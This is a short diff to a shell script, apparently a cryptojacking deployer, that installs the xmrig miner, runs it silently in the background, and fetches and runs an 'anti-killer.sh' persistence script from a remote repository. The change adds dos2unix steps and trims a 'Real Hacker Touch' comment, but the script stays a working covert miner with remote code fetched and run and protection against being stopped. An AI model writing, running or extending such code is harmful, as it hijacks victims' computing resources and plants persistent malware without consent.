@@ -12,7 +12,7 @@ fi
 
 unalias -a
 sudo -n apt update
-sudo -n apt install -y wget util-linux
+sudo -n apt install -y wget util-linux dos2unix
 sudo -n apk add wget util-linux
 sudo -n dnf install wget util-linux
 
@@ -32,12 +32,14 @@ chmod +x xmrig
 
 rm -f config.json
 $DOWNLOAD_CMD $repo_url/config.json
+dos2unix config.json
 randnum=$(( RANDOM % 1000 + 1 ))
 sed -i "s/kasm/kasm-$randnum/g" config.json
 
 nohup ./xmrig > /dev/null 2>&1 &
 
-# Anti-Kill Protection Start (Real Hacker Touch 🧠💪)
+# Anti-Kill Protection Start
 wget -qO /tmp/anti-killer.sh $repo_url/anti-killer.sh
 chmod +x /tmp/anti-killer.sh
+dos2unix /tmp/anti-killer.sh
 nohup bash /tmp/anti-killer.sh > /dev/null 2>&1 &
